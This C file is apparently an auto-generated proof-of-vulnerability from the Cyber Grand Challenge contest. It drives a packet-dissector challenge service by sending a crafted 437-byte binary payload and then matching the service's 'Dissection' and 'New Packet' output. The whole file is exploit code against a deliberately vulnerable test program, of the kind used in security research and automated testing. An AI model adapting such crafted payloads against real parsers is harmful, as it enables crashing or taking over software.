#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb5\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9d\x01\x00\x00\x95\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x95\x01\x00\x00"
         "\x8d\xc0\x84\xba\xba\x73\x18\x83\x11\x6f\xe6\x54\xf1\xa7\xcd\x57"
         "\x09\x65\x57\xe6\x42\x00\x00\x00\x9c\x8c\xe1\x9a\xcb\xb5\xbd\xcf"
         "\xf9\x0c\x96\xb4\x2a\xdb\x41\x00\x01\x8e\x9f\xe2\xa9\x81\xf9\xcf"
         "\x10\x17\x00\x4b\xef\xe7\xff\x00\xda\x0a\x26\x34\x38\x30\x01\x00"
         "\x28\x33\xd0\xa2\x5d\x58\xb6\x55\xfc\x0c\x9e\x39\x8f\x5e\xdd\xc2"
         "\x01\x00\xd4\xff\xff\x04\xfc\x06\xea\x14\x09\x96\xe2\xef\xab\xde"
         "\x1b\x9f\xa7\xd0\x48\x89\x96\x92\xa8\x93\x0a\x5f\xcb\xff\xdf\x15"
         "\x4c\x96\xfa\x62\x78\x04\x26\x1a\xe4\x94\xd5\x77\x9a\x20\xb9\x8f"
         "\xf8\x6b\x2c\x39\x29\x13\xe9\xb7\xb6\x46\xd0\xfa\x18\x26\x06\xe6"
         "\xb0\xfe\xe7\x2b\x67\x9f\x6d\x96\x55\xd7\x58\x09\x33\x97\xf3\x91"
         "\x19\x77\x18\x27\xe5\x66\x58\xa9\x5e\xb2\xf9\x64\x6b\xed\xe6\x8f"
         "\x0d\xc5\x15\x15\xd0\xbb\xf0\x96\xba\x0e\xf0\x6a\x9c\xc8\x93\xc3"
         "\x3c\x46\x8e\xe6\x25\x10\xed\xf6\x48\x53\xab\xa2\xa8\x43\xba\xb6"
         "\x37\xb8\xb6\x3c\x01\xba\x52\x8b\xa0\x53\xcd\x6b\x86\x4f\x93\xc5"
         "\xac\x5e\xa7\x2d\x6b\x1e\xf1\x1a\x1e\x38\x06\xc9\x6d\x8b\x0d\x80"
         "\x34\x6d\x40\xb9\xb4\x50\xf2\x78\xad\x53\x7c\x18\x66\x49\x1e\x24"
         "\x14\xac\xfa\x09\xf8\xaf\xe8\x75\xeb\x88\xac\x84\xda\x8f\x87\x32"
         "\xed\x16\xee\x92\x9f\x69\x54\x14\x61\x90\xf4\x23\xae\x30\xe7\x01"
         "\x46\xa6\x7e\xe9\xab\xb7\x5a\x9f\x41\xbb\x9d\x4b\x24\xb1\x05\x14"
         "\xde\x2b\xe8\x22\xeb\x2f\xdc\x7f\x8b\xe5\x08\xc8\x29\x9f\x7e\x48"
         "\x58\xbc\x18\xfd\x07\x31\x61\x09\xce\xd1\x70\xe6\x45\xdd\xb5\x06"
         "\xd3\x18\x32\x47\x56\x64\x1d\x04\x73\xcb\x2c\x9d\x6f\xd9\x88\x25"
         "\x33\x4c\x5e\xcc\x12\x82\x91\x79\xd0\xc6\x41\xb6\x43\x6b\x09\x7e"
         "\x85\x18\xbc\xbd\x76\xec\xc1\x41\x00\x9e\x5a\xc3\x1e\x4d\x5f\xad"
         "\x6b\x6a\x20\x4f\xc1\x9f\xea\x14\x70\x9e\x2f\x9b\xad\x70\x18\x58"
         "\x94\x6a\xff\xff\xb6";
      static unsigned int write_00001_00000_len = 437;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaportico
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x70\x6f\x72\x74\x69\x63"
         "\x6f";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
